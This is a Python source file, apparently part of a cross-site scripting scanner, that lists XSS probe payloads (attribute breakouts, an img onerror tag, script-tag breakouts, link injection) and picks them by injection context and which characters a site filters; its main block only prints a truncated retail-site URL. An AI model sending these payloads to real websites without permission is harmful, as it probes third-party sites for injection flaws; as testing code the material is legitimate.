

class attack_methodology:

    attr    = ['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
    html    = ['<img src=x onerror="alert(1)">']
    script  = ['"; confirm(1); "', "'; confirm(1); '",  '</script><script>alert(1)</script>']
    url     = ['<a href="XSS">click_me</a>', '%3Ca%20href%3D%22XSS%22%3Eclick_me%3C%2Fa%3E']

    def get_attack_payload(self, context, presence, double_quotes, single_quotes, lessthan_sign, parantheses):
        payloads = []
        
        if context == 'ATTR':
            if not presence : return False, None
            if parantheses  : return True, payloads
            if not double_quotes:   payloads.append(self.attr[0])
            if not single_quotes:   payloads.append(self.attr[1])
            return True, payloads

        if context == 'HTML':
            if not presence : return False, None
            if parantheses  : return True, payloads
            if not lessthan_sign:   payloads.append(self.html[0])
            return True, payloads

        if context == 'SCRIPT':
            if not presence : return False, None
            if parantheses  : return True, payloads
            if not double_quotes:   payloads.append(self.script[0])
            if not single_quotes:   payloads.append(self.script[1])
            if not lessthan_sign:   payloads.append(self.script[2])
            return True, payloads
            
        if context == 'URL':
            if not presence : return False, None
            if parantheses  : return True, payloads
            if not double_quotes:   payloads.append(self.url[0])
            if not single_quotes:   payloads.append(self.url[1])
            return True, payloads
        
        return False, None

if __name__ == "__main__":
    AM = attack_methodology()

    string = 'https___www.kirklands.com_category_Misc_Buy-Online-Pick-Up-In-Store_pc_2343_3228.uts_i=1_q=__q1=Pickup+in+Store_q2=Art+%26+Wall+Decor_store=1_type=nav_x1=delivery_method_x2=primary-cat-name1_icid=navawd_190328_awd+bopis_N'
    
    if len(string) > 150: string = string[:150]
    print(string)
    

